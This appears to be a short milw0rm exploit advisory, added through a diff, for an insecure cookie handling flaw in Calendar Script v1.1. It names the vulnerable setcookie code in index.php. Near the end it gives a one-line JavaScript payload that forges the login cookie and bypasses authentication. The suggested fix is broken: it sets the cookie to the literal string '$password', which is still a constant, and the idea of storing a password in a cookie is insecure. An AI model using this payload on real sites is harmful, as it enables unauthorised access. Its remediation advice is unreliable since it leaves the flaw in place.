@@ -1,0 +1,53 @@
+[START]
+
+#########################################################################################
+[0x01] Informations:
+
+Script         : Calendar Script v1.1
+Download       : http://www.hotscripts.com/jump.php?listing_id=71365&jump_type=1
+Vulnerability  : Insecure Cookie Handling
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Website        : http://osirys.org
+Notes          : Proud to be Italian
+Greets:        : XaDoS, x0r, emgent, Jay, str0ke, Todd and AlpHaNiX
+
+
+#########################################################################################
+[0x02] Bug: [Insecure Cookie Handling]
+######
+
+Bugged file is: /[path]/index.php
+
+[CODE]
+
+if(mysql_num_rows($checkDetails) > 0) {
+    setcookie('nodstrumCalendarV2', '1', time()+3600);	// Cookie will expire in 1 hour.
+    // $loginMsg = '<span style="color: green">You are logged in<i>!</i></span>';
+}
+
+[/CODE]
+
+If we login in correctly, a cookie is created with 'nodstrumCalendarV2' as name and
+'1' as content.
+
+## [!] FIX: Change name or content to the cookie. Example:
+
+[CODE]
+
+if(mysql_num_rows($checkDetails) > 0) {
+    setcookie('nodstrumCalendarV2', '$password', time()+3600);	// Cookie will expire in 1 hour.
+    // $loginMsg = '<span style="color: green">You are logged in<i>!</i></span>';
+}
+
+[/CODE]
+
+
+### [!] EXPLOIT: javascript:document.cookie = "nodstrumCalendarV2=1; path=/";
+
+
+#########################################################################################
+
+[/END]
+
+# milw0rm.com [2008-12-18]
